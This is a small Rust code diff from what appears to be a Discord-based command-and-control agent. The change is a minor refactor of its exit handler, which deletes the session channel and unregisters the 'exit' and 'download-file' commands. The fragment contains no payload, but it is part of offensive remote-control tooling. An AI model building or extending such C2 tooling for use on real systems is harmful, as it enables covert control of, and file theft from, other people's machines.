@@ -24,9 +24,9 @@ pub async fn run(ctx: &Context) -> Result<String, DiscordC2Error> {
     let session_channel = agent.get_session_channel().ok_or_else(|| DiscordC2Error::NoSessionChannel)?;
 
     session_channel.delete(&ctx.http).await?;
-    let command_id = get_command_id_by_name(&ctx, "exit").await
+    let command_id = get_command_id_by_name(ctx, "exit").await
         .ok_or_else(|| DiscordC2Error::CommandNotFound("exit".to_string()))?;
-    let download_id = get_command_id_by_name(&ctx, "download-file").await.ok_or_else(|| DiscordC2Error::CommandNotFound("download-file".to_string()))?;
+    let download_id = get_command_id_by_name(ctx, "download-file").await.ok_or_else(|| DiscordC2Error::CommandNotFound("download-file".to_string()))?;
 
     Command::delete_global_application_command(&ctx.http, CommandId::from(command_id)).await?;
     Command::delete_global_application_command(&ctx.http, CommandId::from(download_id)).await?;
